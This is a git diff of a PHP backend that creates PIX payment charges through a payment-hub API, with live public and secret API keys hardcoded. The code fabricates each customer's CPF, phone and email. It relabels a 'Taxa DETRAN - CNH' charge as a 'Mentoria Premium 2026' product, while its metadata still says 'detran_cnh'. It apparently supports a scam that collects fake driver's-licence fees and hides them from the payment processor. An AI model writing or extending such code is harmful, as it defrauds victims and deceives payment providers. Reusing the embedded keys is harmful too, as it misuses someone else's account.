@@ -90,57 +90,89 @@ $cpf = gerarCpf();
 $telefone = gerarTelefone();
 $email = strtolower(str_replace(' ', '.', $nome)) . '+' . uniqid() . '@email.com';
 
-// UTM deve ser enviado como STRING no formato query string
-$utmString = null;
+// === NITRO PAGAMENTOS HUB API ===
+// Processa dados de tracking/UTM como objeto
+$tracking = [];
 if (!empty($input['utm'])) {
     if (is_string($input['utm'])) {
-        $utmString = $input['utm']; // Já é string, usa direto
-        error_log("PIX Request - UTM recebido (string): " . $utmString);
+        // Se vier como string query, parseia para array
+        parse_str($input['utm'], $utmParams);
+        error_log("PIX Request - UTM recebido (string parseada): " . json_encode($utmParams));
     } elseif (is_array($input['utm'])) {
-        // Se por algum motivo vier como array, converte para string
-        $utmString = http_build_query($input['utm']);
-        error_log("PIX Request - UTM recebido (array convertido): " . $utmString);
+        $utmParams = $input['utm'];
+        error_log("PIX Request - UTM recebido (array): " . json_encode($utmParams));
+    }
+    
+    // Mapeia os campos UTM para o formato da API
+    if (!empty($utmParams)) {
+        if (!empty($utmParams['utm_source'])) $tracking['utm_source'] = $utmParams['utm_source'];
+        if (!empty($utmParams['utm_medium'])) $tracking['utm_medium'] = $utmParams['utm_medium'];
+        if (!empty($utmParams['utm_campaign'])) $tracking['utm_campaign'] = $utmParams['utm_campaign'];
+        if (!empty($utmParams['utm_term'])) $tracking['utm_term'] = $utmParams['utm_term'];
+        if (!empty($utmParams['utm_content'])) $tracking['utm_content'] = $utmParams['utm_content'];
+        if (!empty($utmParams['src'])) $tracking['src'] = $utmParams['src'];
     }
 }
 
-if (empty($utmString) && !empty($_SERVER['QUERY_STRING'])) {
-    $utmString = $_SERVER['QUERY_STRING'];
-    error_log("PIX Request - UTM da query string: " . $utmString);
+// Se não veio UTM no body, pega da query string
+if (empty($tracking) && !empty($_SERVER['QUERY_STRING'])) {
+    parse_str($_SERVER['QUERY_STRING'], $queryParams);
+    if (!empty($queryParams['utm_source'])) $tracking['utm_source'] = $queryParams['utm_source'];
+    if (!empty($queryParams['utm_medium'])) $tracking['utm_medium'] = $queryParams['utm_medium'];
+    if (!empty($queryParams['utm_campaign'])) $tracking['utm_campaign'] = $queryParams['utm_campaign'];
+    if (!empty($queryParams['utm_term'])) $tracking['utm_term'] = $queryParams['utm_term'];
+    if (!empty($queryParams['utm_content'])) $tracking['utm_content'] = $queryParams['utm_content'];
+    if (!empty($queryParams['src'])) $tracking['src'] = $queryParams['src'];
+    error_log("PIX Request - UTM da query string: " . json_encode($tracking));
 }
 
-$apiUrl = 'https://www.pagamentos-seguros.app/api-pix/79SNVAUnB8QDtofnzx3CIeS-MEfGM436ILsEX9PTTFaJjKuEJ3D0YJtZNOX1r61FJOV91G8eND7YTiZtgN5LOw';
+// Nova API URL
+$apiUrl = 'https://api.nitropagamento.app';
 
+// Chaves da API Nitro Pagamentos
+$publicKey = 'pk_live_YY0NyWvVi2bWmA6CB3Ss6PIw1EXcGy9h';
+$privateKey = 'sk_live_aQRBskkLzRTWvPd6wB8yl7JtohxwpGwA';
+
+// Payload no formato da Nitro Pagamentos HUB API
 $payload = [
-    'amount'        => $amountInCents,
-    'description'   => 'Taxa DETRAN - CNH do Brasil',
-    'customer'      => [
+    'amount'         => $amount, // Em REAIS (float), não centavos
+    'payment_method' => 'pix',
+    'description'    => 'Mentoria Premium 2026 - o Ano da Revolucao',
+    'items'          => [
+        [
+            'title'     => 'Mentoria Premium 2026 - o Ano da Revolucao',
+            'unitPrice' => $amountInCents,
+            'quantity'  => 1,
+            'tangible'  => false
+        ]
+    ],
+    'customer'       => [
         'name'     => $nome,
-        'document' => $cpf,
         'email'    => $email,
+        'document' => $cpf,
         'phone'    => $telefone,
     ],
-    'item'          => [
-        'title'    => 'Taxa DETRAN - CNH do Brasil',
-        'price'    => $amountInCents,
-        'quantity' => 1,
+    'metadata'       => [
+        'order_id'   => uniqid('CNH_'),
+        'product_id' => 'detran_cnh'
     ],
-    'paymentMethod' => 'PIX',
 ];
 
-if (!empty($utmString)) {
-    $payload['utm'] = $utmString; // Envia como STRING conforme documentação
-    error_log("PIX Request - UTM adicionado ao payload: " . $utmString);
+// Adiciona tracking se tiver dados UTM
+if (!empty($tracking)) {
+    $payload['tracking'] = $tracking;
+    error_log("PIX Request - Tracking adicionado ao payload: " . json_encode($tracking));
 } else {
-    error_log("PIX Request - Nenhum UTM encontrado");
+    error_log("PIX Request - Nenhum dado de tracking/UTM encontrado");
 }
 
 // Log do payload completo para debug (sem dados sensíveis completos)
 error_log("PIX Request - Payload completo: " . json_encode([
-    'amount' => $amountInCents,
+    'amount' => $amount,
     'description' => $payload['description'],
-    'paymentMethod' => 'PIX',
-    'has_utm' => !empty($payload['utm']),
-    'utm_value' => !empty($payload['utm']) ? $payload['utm'] : null,
+    'payment_method' => 'pix',
+    'has_tracking' => !empty($payload['tracking']),
+    'tracking_value' => !empty($payload['tracking']) ? $payload['tracking'] : null,
     'customer_name' => substr($nome, 0, 20) . '...',
     'customer_email' => substr($email, 0, 20) . '...',
 ]));
@@ -148,18 +180,19 @@ error_log("PIX Request - Payload completo: " . json_encode([
 // Log do payload completo antes de enviar (para debug)
 $payloadJson = json_encode($payload, JSON_UNESCAPED_UNICODE);
 error_log("PIX Request - Payload JSON completo: " . substr($payloadJson, 0, 1000));
-error_log("PIX Request - Payload tem UTM: " . (isset($payload['utm']) ? 'SIM' : 'NÃO'));
+error_log("PIX Request - Payload tem tracking: " . (isset($payload['tracking']) ? 'SIM' : 'NÃO'));
 
-// Se tiver UTM e der erro, tenta sem UTM como fallback
-$payloadBackup = $payload;
-$hasUtm = isset($payload['utm']);
+// Autenticação Basic Auth (formato: pk_:sk_ em Base64)
+$credentials = $publicKey . ':' . $privateKey;
+$authString = base64_encode($credentials);
 
 $ch = curl_init($apiUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $payloadJson);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'Content-Type: application/json',
+    'Authorization: Basic ' . $authString,
+    'Content-Type: application/json',
 ]);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
@@ -169,39 +202,11 @@ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 $curlError = curl_error($ch);
 curl_close($ch);
 
-// Log para debug (comentar em produção se necessário)
+// Log para debug
 error_log("PIX Request - HTTP Code: $httpCode");
 error_log("PIX Request - Response: " . substr($response, 0, 500));
 if ($curlError) {
     error_log("PIX Request - cURL Error: $curlError");
-}
-
-// Se der erro 500 e tiver UTM, tenta novamente sem UTM
-if ($httpCode >= 500 && $hasUtm) {
-    error_log("PIX Request - Erro 500 detectado com UTM, tentando sem UTM...");
-    unset($payload['utm']);
-    $payloadJsonWithoutUtm = json_encode($payload, JSON_UNESCAPED_UNICODE);
-    
-    $ch2 = curl_init($apiUrl);
-    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch2, CURLOPT_POST, true);
-    curl_setopt($ch2, CURLOPT_POSTFIELDS, $payloadJsonWithoutUtm);
-    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
-        'Content-Type: application/json',
-    ]);
-    curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch2, CURLOPT_MAXREDIRS, 5);
-    
-    $response = curl_exec($ch2);
-    $httpCode = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
-    $curlError = curl_error($ch2);
-    curl_close($ch2);
-    
-    error_log("PIX Request - Retry sem UTM - HTTP Code: $httpCode");
-    error_log("PIX Request - Retry sem UTM - Response: " . substr($response, 0, 500));
-    if ($curlError) {
-        error_log("PIX Request - Retry sem UTM - cURL Error: $curlError");
-    }
 }
 
 if ($response === false) {
@@ -243,20 +248,24 @@ if ($httpCode < 200 || $httpCode >= 300) {
     exit;
 }
 
-$pixCode =
-    $decoded['pixCode'] ??
-    $decoded['brcode'] ??
-    $decoded['qrcode'] ??
-    $decoded['qr_code'] ??
-    $decoded['pix_code'] ??
-    null;
+// Verifica se a API retornou sucesso
+if (empty($decoded['success'])) {
+    $errorResponse = [
+        'success' => false,
+        'error' => 'API retornou sucesso = false',
+        'response' => $decoded,
+        'console' => "PIX Error - API returned success=false"
+    ];
+    error_log("PIX Error Response: " . json_encode($errorResponse));
+    echo json_encode($errorResponse);
+    exit;
+}
 
-$transactionId =
-    $decoded['transactionId'] ??
-    $decoded['txid'] ??
-    $decoded['transaction_id'] ??
-    $decoded['id'] ??
-    null;
+// Extrai dados da resposta (Nitro retorna dentro de 'data')
+$data = $decoded['data'] ?? $decoded;
+
+$pixCode = $data['pix_code'] ?? null;
+$transactionId = $data['id'] ?? null;
 
 // Log para debug
 error_log("PIX Response - Transaction ID: " . ($transactionId ?: 'N/A'));
